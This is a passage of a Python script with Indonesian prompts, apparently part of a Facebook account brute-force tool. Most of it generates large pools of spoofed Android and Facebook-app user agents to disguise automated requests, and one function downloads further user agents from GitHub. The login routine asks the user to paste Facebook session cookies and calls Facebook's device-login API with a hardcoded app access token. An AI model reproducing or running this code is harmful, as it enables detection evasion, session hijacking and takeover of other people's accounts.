	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='id-id;'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Linux; Android 5.1.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='HUAWEI M2-A01W)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 8.1.0; CPH1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='CPH1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/537.36'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	
### --------- [ User Agent By Denventa ] --------- ###	
for xd in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	afr=random.choice(['SAMSUNG SM-J210Y','SAMSUNG SM-E203Y','SAMSUNG SM-T87V','SAMSUNG SM-D738P','SAMSUNG SM-W748D','SAMSUNG SM-Z794M','SAMSUNG SM-K144T','SAMSUNG SM-L372N','SAMSUNG SM-B588T','SAMSUNG SM-R584V','SAMSUNG SM-R108Z'])
	denv='Mozilla/5.0 (Linux; Android {a}; {afr}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku = random.choice([denv])
	ugen2.append(uaku)

for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P'])
	random2=random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D'])
	random3=random.choice(['CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501'])
	random4=random.choice(['Xiaomi 10 Pro','2201123G','2203129G','2201122G','2206122SC','2203121C','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro'])
	random5=random.choice(['vivo 1002T','Vivo 1605','vivo 1914','vivo 2019','vivo 2023','vivo 2027','Vivo 6','Vivo 93K Prime','V2242A','V2227A','vivo 1918'])
	random6=random.choice(['OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f'])
	random7=random.choice(['Nokia 1','Nokia 1 Plus','Nokia 1011','Nokia C01','Nokia C1 2nd Edition','Nokia C20','Nokia C20 Plus','Nokia C21','Nokia C21 Plus','Nokia C3'])
	random8=random.choice(['21061119DG','21121119VL','220233L2G','220333QL','M2004J15SC','M2004J7BC','Redmi 11 Lite','Redmi 1S','Redmi 9 Pro','Redmi Note 9 Pro'])
	random9=random.choice(['M2006C3MI','22031116AI','220333QPG','POCO F2 Pro','M2012K11AG','M2104K10I','22021211RG','21121210G','M2004J19PI','POCO M2 Pro'])
	random10=random.choice(['WOW64'])
	_1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_3=f'Mozilla/5.0 (Linux; Android {a}; {random3} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_4=f'Mozilla/5.0 (Linux; Android {a}; {random4} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_5=f'Mozilla/5.0 (Linux; Android {a}; {random5} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_6=f'Mozilla/5.0 (Linux; Android {a}; {random6} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_7=f'Mozilla/5.0 (Linux; Android {a}; {random7} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_8=f'Mozilla/5.0 (Linux; Android {a}; {random8} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_9=f'Mozilla/5.0 (Linux; Android {a}; {random9} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_10=f'Mozilla/5.0 (Windows NT {a}; {random10} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku2 = random.choice([_1,_2,_3,_4,_5,_6,_7,_8,_9,_10])
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	
for xd in range(10000) :
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e='Mobile Safari/537.36'
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5) Plus Build/NPNS25.137-35-5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='MotoG3 Build/MPIS24.107-55-2-17; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto E (4) Plus Build/NMA26.42-56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G (5S) Plus Build/NPS26.116-51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='moto e5 Build/OPPS27.91-176-11-16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(6, 14) 
	c='SM-A105'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=str(random.randrange(10, 214))+'.0.'+str(random.randrange(3000, 7000))+'.'+str(random.randrange(10, 275)) 
	f=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	geko=f'{a} {b}; {c}) {d}{e} {f}'
	ugen2.append(geko) 
	
	a =random.choice(['Mozilla/5.0 (Linux; Android', 'Mozilla/5.0 (Linux; U; Android']) 
	b= str(random.randrange(1, 14))+'.'+str(random.randrange(0,6))+'.'+str(random.randrange(0, 6)) 
	c='Moto G Play Build/NPIS26.48-43-2) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	d=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	e=random.choice(['Mobile Safari/537.36', 'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]', 'Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mobile Safari/537.36 AlohaBrowser/3.9.3', 'UCBrowser/12.13.4.1214 Mobile Safari/537.36', 'Mobile Safari/537.36 OPX/1.1', 'Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]', 'Mobile Safari/537.36 OPR/53.0.2569.141117', 'Mobile Safari/537.36 PTST/200804.150828', 'Mobile Safari/537.36 Tapatalk/8.1.7', 'Safari/534.30']) 
	usam=f'{a} {b}; {c}{d} {e}'
	ugen.append(usam)  
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='RMX'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='CPH'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c}{d}) {e}{f} {g}'
	ugen.append(uga) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 14) 
	c='vivo'
	d=str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9))+str(random.randrange(1, 9)) 
	e='AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/'
	f=str(random.randrange(20, 275))+'.0.'+str(random.randrange(30, 7000))+'.'+str(random.randrange(20, 275)) 
	g='Mobile Safari/537.36'
	uga=f'{a} {b}; {c} {d}) {e}{f} {g}'
	ugen.append(uga)
      
for x in range(20000):
      android = str(random.randint(4,9))+'.'+str(random.randint(0,1))+'.'+str(random.randint(0,1))
      fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
      fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
      build2 = ['OPM3.171019.016','OPR1.170623.032','OPM2.171019.029','OPM5.171019.017','TP1A.220905.001','QP1A.190711.020','RP1A.200720.011','SP1A.210812.016']
      merk2 = ['Lenovo TB2-X30L','ONEPLUS A5000','LGLS665','vivo Y51L','LG-M150','vivo Y21','OPPO A59s','OPPO R9 Plusm A','vivo Y71A','CPH1719','vivo Y35','vivo X20','Aquaris M5.5','vivo X6D','OPPO R11','Aquaris X5','Aquaris E5','Lenovo TB3-710','FS510','FS405','ONEPLUS A5010','NX531J','ONEPLUS A3003','LG-H870DS','Nexus 5X ','Aquaris X2']
      fbcr = str(random.choice(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata']))
      fblc = str(random.choice(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID']))
      fbpn = str(random.choice(['com.facebook.katana','com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.mlite','MessengerLite']))
      merk_build = str(random.choice(merk2))+'<=>'+str(random.choice(build2));merks,build2 = merk_build.split('<=>')
      large = str(random.choice(['1.0','1.5','2.0','2.5','3.0','3.5']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']))+'<=>'+str(random.choice(['760','750','1092','1082','650','1080']));denincity,width,heigt = large.split('<=>')      
      dalvik = str(random.choice(['2.1.0','2.0.0','1.6.0','1.5.0','1.4.0','1.2.0','1.1.0']))
      ua1 = 'Dalvik/2.1.0 (Linux; U; Android  '+str(android)+'; vivo 1612 Build/NRD90M) [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/vivo;FBBD/vivo;FBDV/vivo 1612;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ua2 = 'Dalvik/'+str(dalvik)+' (Linux; U; Android '+str(android)+'; '+str(merks)+' Build/'+str(build2)+') [FBAN/FB4A;FBAV/'+str(fbav)+';FBPN/com.facebook.katana;FBDV/merek;FBSV/'+str(android)+';FBDM/{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ua3 = 'Dalvik/2.1.0 (Linux; U; Android '+str(android)+'; Redmi 5A Build/'+str(build2)+') [FBAN/MessengerLite;FBAV/'+str(fbav)+';FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/'+str(fbbv)+';FBCR/Tsel-PakaiMasker;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Redmi 5A;FBSV/'+str(android)+';FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/'+'{density='+str(denincity)+',width='+str(width)+',height='+str(heigt)+'};FBCR/'+str(fbcr)+';FBLC/id_ID;FB_FW/1;]'
      ugen.append(str(random.choice([ua2,ua1,ua3])))
      
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen2.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/Itsmeafriliyan/sakera/main/ua.txt').text
		ua=open('.ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua.txt','r').read().splitlines()
      
### ----- [ Clear Terminal ] ----- ###
def clear():
      if sys.platform.lower() == 'linux':
            try:os.system('clear')
            except:pass

      elif sys.platform.lower() == 'win':
            try:os.system('cls')
            except:pass

def login():
      global data,data2
      clear();cetak(Panel(''' %s_______ _     _        _______ _____     ______  _______
 |  |  | |     | |         |      |   ___ |_____] |______
 |  |  | |_____| |_____    |    __|__     |_____] |      
                                                         
'''%(K1),width=75,style='bold white'))
      cetak(Panel('    %sMasukan cokies facebook saran ektensi %s"cokiedough" %sKiwi Browser'%(K1,H1,K1),width=75,style='bold white'))
      cok = Console().input('%s[%s•%s] Masukan Cokies :%s '%(P1,H1,P1,H1))
      try:
            link = ses.post('https://graph.facebook.com/v16.0/device/login/', data={'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e', 'scope': ''}).json()
